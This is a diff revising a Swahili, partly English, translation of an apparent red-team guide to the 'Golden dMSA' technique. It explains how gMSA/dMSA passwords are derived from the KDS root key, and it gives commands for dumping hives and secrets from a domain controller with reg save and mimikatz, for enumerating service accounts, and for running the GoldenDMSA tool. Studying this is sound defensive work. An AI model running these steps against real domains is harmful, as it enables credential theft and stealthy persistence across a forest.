@@ -7,13 +7,13 @@
 Windows Managed Service Accounts (MSA) ni wakala maalum walioundwa kuendesha huduma bila haja ya kusimamia nywila zao kwa mikono.
 Kuna ladha mbili kuu:
 
-1. **gMSA** – kundi la Managed Service Account – linaweza kutumika kwenye mwenyeji wengi ambao wameidhinishwa katika sifa yake ya `msDS-GroupMSAMembership`.
-2. **dMSA** – delegated Managed Service Account – mrithi (preview) wa gMSA, ukitegemea usimbuaji sawa lakini ukiruhusu hali za ugawaji zenye granular zaidi.
+1. **gMSA** – kundi la Akaunti ya Huduma ya Usimamizi – inaweza kutumika kwenye mwenyeji wengi ambao wameidhinishwa katika sifa yake ya `msDS-GroupMSAMembership`.
+2. **dMSA** – Akaunti ya Huduma ya Usimamizi iliyotolewa – mrithi (preview) wa gMSA, inategemea usimbaji sawa lakini inaruhusu hali za ugawaji zenye granular zaidi.
 
-Kwa toleo zote mbili **nywila haihifadhiwi** kwenye kila Domain Controller (DC) kama hash ya kawaida ya NT. Badala yake kila DC inaweza **kuvuta** nywila ya sasa kwa wakati kutoka:
+Kwa toleo zote mbili **nywila haihifadhiwi** kwenye Kituo cha Kikoa (DC) kama hash ya kawaida ya NT. Badala yake kila DC inaweza **kuvuta** nywila ya sasa kwa wakati kutoka:
 
-* Funguo ya **KDS Root Key** ya msitu mzima (`KRBTGT\KDS`) – siri yenye jina la GUID iliyozalishwa kwa bahati nasibu, iliyorejelewa kwa kila DC chini ya kontena ya `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
-* **SID** ya akaunti lengwa.
+* Funguo ya KDS Root Key ya msitu mzima (`KRBTGT\KDS`) – siri yenye jina la GUID iliyozalishwa kwa bahati nasibu, iliyorekebishwa kwa kila DC chini ya kontena ya `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
+* Akaunti ya lengo **SID**.
 * **ManagedPasswordID** (GUID) ya kila akaunti inayopatikana katika sifa ya `msDS-ManagedPasswordId`.
 
 Uchimbaji ni: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob ya byte 240 hatimaye **imeandikwa kwa base64** na kuhifadhiwa katika sifa ya `msDS-ManagedPassword`.
@@ -23,7 +23,7 @@ Hakuna trafiki ya Kerberos au mwingiliano wa kikoa unahitajika wakati wa matumiz
 
 Ikiwa mshambuliaji anaweza kupata ingizo zote tatu **offline** wanaweza kuhesabu **nywila halali za sasa na za baadaye** kwa **kila gMSA/dMSA katika msitu** bila kugusa DC tena, wakiepuka:
 
-* Kurejelewa kwa Kerberos kabla ya uthibitishaji / kumbukumbu za ombi la tiketi
+* Kurejelewa kwa Kerberos / kumbukumbu za ombi la tiketi
 * Ukaguzi wa kusoma LDAP
 * Vipindi vya kubadilisha nywila (wanaweza kuhesabu mapema)
 
@@ -31,13 +31,13 @@ Hii ni sawa na *Golden Ticket* kwa akaunti za huduma.
 
 ### Prerequisites
 
-1. **Kuathiriwa kwa kiwango cha msitu** cha **DC moja** (au Msimamizi wa Biashara). Upatikanaji wa `SYSTEM` unatosha.
+1. **Kuvunjika kwa kiwango cha msitu** cha **DC moja** (au Msimamizi wa Biashara). Upatikanaji wa `SYSTEM` unatosha.
 2. Uwezo wa kuorodhesha akaunti za huduma (kusoma LDAP / RID brute-force).
 3. .NET ≥ 4.7.2 x64 workstation ili kuendesha [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) au msimbo sawa.
 
 ### Phase 1 – Extract the KDS Root Key
 
-Dump kutoka DC yoyote (Volume Shadow Copy / raw SAM+SECURITY hives au siri za mbali):
+Dump kutoka kwa DC yoyote (Volume Shadow Copy / raw SAM+SECURITY hives au siri za mbali):
 ```cmd
 reg save HKLM\SECURITY security.hive
 reg save HKLM\SYSTEM  system.hive
@@ -46,17 +46,17 @@ reg save HKLM\SYSTEM  system.hive
 mimikatz # lsadump::secrets
 mimikatz # lsadump::trust /patch   # shows KDS root keys too
 ```
-Mfuatano wa base64 uliopewa jina `RootKey` (jina la GUID) unahitajika katika hatua za baadaye.
+The base64 string labelled `RootKey` (GUID name) is required in later steps.
 
-### Awamu ya 2 – Kuorodhesha vitu vya gMSA/dMSA
+### Phase 2 – Enumerate gMSA/dMSA objects
 
-Pata angalau `sAMAccountName`, `objectSid` na `msDS-ManagedPasswordId`:
+Retrieve at least `sAMAccountName`, `objectSid` and `msDS-ManagedPasswordId`:
 ```powershell
 # Authenticated or anonymous depending on ACLs
 Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
 Select sAMAccountName,objectSid,msDS-ManagedPasswordId
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) inatekeleza njia za msaada:
+[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) inatekeleza hali za msaada:
 ```powershell
 # LDAP enumeration (kerberos / simple bind)
 GoldendMSA.exe info -d example.local -m ldap
